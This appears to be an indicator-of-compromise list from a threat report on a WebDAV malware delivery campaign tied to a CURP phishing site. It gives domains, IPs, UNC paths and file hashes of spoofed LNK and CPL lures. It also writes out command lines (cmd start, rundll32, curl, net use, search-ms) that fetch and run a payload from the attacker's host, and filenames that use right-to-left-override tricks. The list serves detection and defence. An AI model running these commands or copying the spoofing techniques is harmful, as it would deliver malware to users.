type;value;note
domain;onedrive.cv;Primary WebDAV/HTTP staging domain.
url;hxxps://gobf[.]mx;CURP phishing page.
domain;gobf.mx;CURP phishing domain.
ip-dst;138.124.123.87;WebDAV panel and delivery infrastructure IP.
ip-dst;203.161.39.169;Secondary infrastructure IP referenced by the report.
url;http://onedrive.cv/;Root URL for delivery infrastructure.
url;http://onedrive.cv/Downloads/6/HyperPackSetup.exe;Main second-stage payload URL.
url;http://onedrive.cv/Downloads/4/;Remote delivery directory used by launcher tests.
windows-path;\\onedrive.cv\Downloads\6\HyperPackSetup.exe;Direct UNC path for second-stage payload execution.
windows-path;\\onedrive.cv@80\Downloads;WebDAV-over-HTTP UNC root.
windows-path;\\onedrive.cv@80\DavWWWRoot\Downloads;DavWWWRoot WebDAV path.
windows-path;\\onedrive.cv@SSL@443\DavWWWRoot\Downloads;SSL WebDAV DavWWWRoot path.
windows-path;\\138.124.123.87@80\Downloads\\;IP-based WebDAV UNC path.
windows-path;\\onedrive.cv\Downloads\cpl\evil.cpl;Remote Control Panel applet stager path.
filename;HyperPackSetup.exe;Main second-stage payload filename.
filename;%TEMP%\HyperPackSetup.exe;Temp payload path used by download/copy launchers.
command;"cmd.exe /c start """" ""\\onedrive.cv\Downloads\6\HyperPackSetup.exe""";Direct UNC payload execution command.
command;"cmd.exe /c pushd ""\\onedrive.cv\Downloads\6"" && start """" ""HyperPackSetup.exe""";pushd/start WebDAV execution command.
command;rundll32.exe url.dll,FileProtocolHandler \\onedrive.cv\Downloads\6\HyperPackSetup.exe;FileProtocolHandler execution command.
command;"curl.exe -L --ssl-no-revoke -o ""%TEMP%\HyperPackSetup.exe"" ""http://onedrive.cv/Downloads/6/HyperPackSetup.exe""";Download-to-temp execution command.
command;"net use Z: ""\\onedrive.cv@80\Downloads"" /persistent:no";Explicit WebDAV share mapping command.
command;search-ms:query=*&crumb=location:\\onedrive.cv@80\Downloads\4&displayname=Documents;search-ms WebDAV location abuse.
hostname;vm-dbe0a038-291;"Tracker MachineID observed in 3 LNK files; VM/test builder host artefact."
sha256;0dfa19d415ca8a405dda8c75d36d245c073b92f10a047a334324bd707b602b93;Downloads/SantaNewFile/raznie/Annual_Report‮ғｄр.cpl
sha256;a7930817927c31034328f64150506c64c7c64b10f351bca722c871a4a1cec98b;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-dir-start.CVE20259491.lnk
sha256;ba4f5257356c78dc0c6601b77ac70e87a1de8182533010122a91cf9a02a6d468;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-pushd-start.CVE20259491.lnk
sha256;f30847a8d0c591ca7b148ca59e5b23f002c35f143325f65d4d0bb321db7a774d;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-start-min.CVE20259491.lnk
sha256;ace8441e46e31f312c32594f6da3f1f2baaaa55aec44cac04f3fa4d98a51f13c;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-start.CVE20259491.lnk
sha256;5501c371aac747b1d3339379420feb092661ddff4f4fcaf579d431ae614b7ad2;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.curl-http-temp-run.CVE20259491.lnk
sha256;ac1f0b57a18d1df3c2a5408d1b8b3522e18580683557d01f406d0ab8eed2d7f5;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.direct.CVE20259491.lnk
sha256;08d325b8bb2edeca2371763b7a627e1d4bf9190262752562c066dbe5b99a9eca;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.explorer-file.CVE20259491.lnk
sha256;2fd7c75f27a967f9612620c7fda539f08f0079cfb06a0976b05ea6ee83ef1d8e;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.explorer-folder.CVE20259491.lnk
sha256;106ca162a505c33c07c75db405af2098852f722ad40ea56f39a5076c054e9746;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.netuse-copy-run.CVE20259491.lnk
sha256;1da3c71888adc19bc6cba520f2f67a84a93dda95ededb9de41a8368718c2a364;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.powershell-start.CVE20259491.lnk
sha256;a64fb4e79b9766cb1f34dbc49d1c05adb9d948863fd39d5f0b75b7fec0040cb1;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.ps-bitstransfer-http-temp-run.CVE20259491.lnk
sha256;4ac87d9fe4733164c22d5c30e6d2679221efbda1ef3c076934e5e351068209d6;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.rundll32-filehandler.CVE20259491.lnk
sha256;cb8dbf7a24e66a77567cc0bbce7013deb8ee4cb93a0134a0771755b8fb8f695d;Downloads/4/testik3/HyperPackSetup.powershell-start.CVE20259491.‮ᴘｄƒ.lnk
sha256;5b761561af11876f6898e0d0af6c9322222b70344a9173d4ce2817a75ae3278b;Downloads/4/testik3/HyperPackSetup.ps-bitstransfer-http-temp-run.CVE20259491.‮ᴘｄƒ.lnk
sha256;9edc478eeee0447986f6ef90e79a8e08cd1ad8aa291d1c35a5dd482f996eb538;Downloads/4/testik3/HyperPackSetup.rundll32-filehandler.CVE20259491.‮ᴘｄƒ.lnk
sha256;64084cf32024c5e302707b2fe2db354d8497a43f06d596059d4f3a28d6f6728f;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-dir-start.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;20f7695798803bee2ae7504830e4dc640434932b413e72fb32d57655d25c6175;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-dir-start.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;dd2426d5a7aaae8d4255d3079f48667f041363f563e8524b3ea436ec6b6295ba;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-pushd-start.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;87335ddb5961b0c587858bd35adc0de36db21b798bc1484c1704dec0d0db199b;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-pushd-start.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;e4370ccbc2a8a3f88e0b29a3617f00e29e6613b275e50d7332e93409e66fbf60;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-start-min.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;bdb3a6b32d8a5ca0b26927a7fc30de9036905081975227d26dbed83ff37a7315;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-start-min.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;82a992b50829058d3658bb53f34c7463228586d3283e2e25d1af6f2388de22b3;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-start.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;4e208c57cce5bf62a37efabf936b6111974f89edf74a2bd46f6c8eb07f2fc24c;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.cmd-start.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;748757a94716b89b1211a6c74f9df24529c1dcd41b5999beaeb089e510121744;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.curl-http-temp-run.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;ca53611f13ea272ecd306c4fae33b2e380d8848df507ec09547a003fd1e31c75;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.curl-http-temp-run.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;c1b5e2fdad29aa2200a677b1b8c3ee2e10c341f3ce4348736507e40b9811e20a;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.direct.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;3b021f03dfdad311f2792e8a18c456ca643ff774c9b5c9ca016da3498ab35634;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.direct.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;99cb165731e33af3cdae71644f362e0c9235f499996e4daa38b159dd0e5e0ef6;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.explorer-file.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;dd89c3d9e114059a6089c5d346dd00ae7f1d4dc070fc4ebc48986ca779cd7d41;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.explorer-file.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;6e521d4a7e305bde09f70ee30531f6617f524e292456e4b4777c65ede9c35817;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.explorer-folder.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;55767429aa7d366be58c37c1ea01112494f58b721b12d5e55be7c78e10e3fd4d;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.explorer-folder.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;9a0fb96a3e0e543f1841a87d992814ddbdccd9a61e7c1a2296b55572a9860339;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.netuse-copy-run.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;2ee7460a939deb8e65c70f892b16a477ca514a530bbdbc1ea8bbe03dd0b6776f;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.netuse-copy-run.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;2b5650603a778446b8f57bb7adece8853cf4183cfcffa2870647ef7f6ac80da6;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.powershell-start.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;607006d64a6dc353856926d23617ab802b971933a72e0714a63e8cb697ffa247;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.powershell-start.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;8df3aa2df8f2c2c8dcc1120bfab40ed5bee36aa7fe9fd103552161b4804d715d;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.ps-bitstransfer-http-temp-run.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;4c5a7f2e0500af7825a04b2510aacdaad8117893cc76dadd163382974553af3a;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.ps-bitstransfer-http-temp-run.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;c52e2a809400a79f1b70c13a349153531ef40f6dfda4def73b83e4f04fbcf9d8;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.rundll32-filehandler.SPOOFEXE_HIDEARGS_DISABLETARGET.lnk
sha256;8179e7ee19f812bfff1e870ceaa3c94084cac7cec653fb6dfc7d443e0cf46445;Downloads/4/testik2/HyperPackSetup.‮ᴘｄƒ.rundll32-filehandler.SPOOFEXE_SHOWARGS_ENABLETARGET.lnk
sha256;737d98dcadae8d0772f483ea8495166a0be3bba054339fade73b4bd33948bf8b;Downloads/4/testik3/HyperPackSetup.cmd-dir-start.SPOOFEXE_SHOWARGS_ENABLETARGET.‮ᴘｄƒ.lnk
sha256;aae5b2bc8aa983d7b9fd7cee455aea57ada6402d5d2327e1aadabbdc8e6a6363;Downloads/4/testik3/HyperPackSetup.cmd-pushd-start.SPOOFEXE_SHOWARGS_ENABLETARGET.‮ᴘｄƒ.lnk
